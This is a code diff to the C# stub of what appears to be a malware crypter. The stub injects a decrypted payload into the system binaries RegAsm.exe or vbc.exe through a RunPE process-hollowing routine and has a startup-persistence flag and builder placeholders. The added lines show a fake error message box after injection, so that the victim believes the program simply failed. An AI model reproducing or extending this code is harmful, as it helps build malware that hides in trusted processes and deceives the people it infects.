@@ -64,6 +64,7 @@ namespace stupidcancercodeisruiningeverything
 		//Self explantory
         bool _startup = [startup-replace];
         string injectTo = "[inject-replace]";
+		bool _fakemessage = [fakemessage-replace];
         string injectionPath2 = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "RegAsm.exe");
         string injectionPath3 = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "vbc.exe");
         public FrmOne()
@@ -100,6 +101,11 @@ namespace stupidcancercodeisruiningeverything
             RunPe1.Run(injectionPath2, "", eBytes2);
             if(injectTo == "[vbc]")
             RunPe1.Run(injectionPath3, "", eBytes2);
+			//Fake Message
+			if(_fakemessage)
+			{
+			MessageBox.Show("[messagetext-replace]", "[messagetitle-replace]", MessageBoxButtons.OK,MessageBoxIcon.Error);
+			}
 			//Stopping the program because runpe is already injected
             Environment.Exit(0);
         }
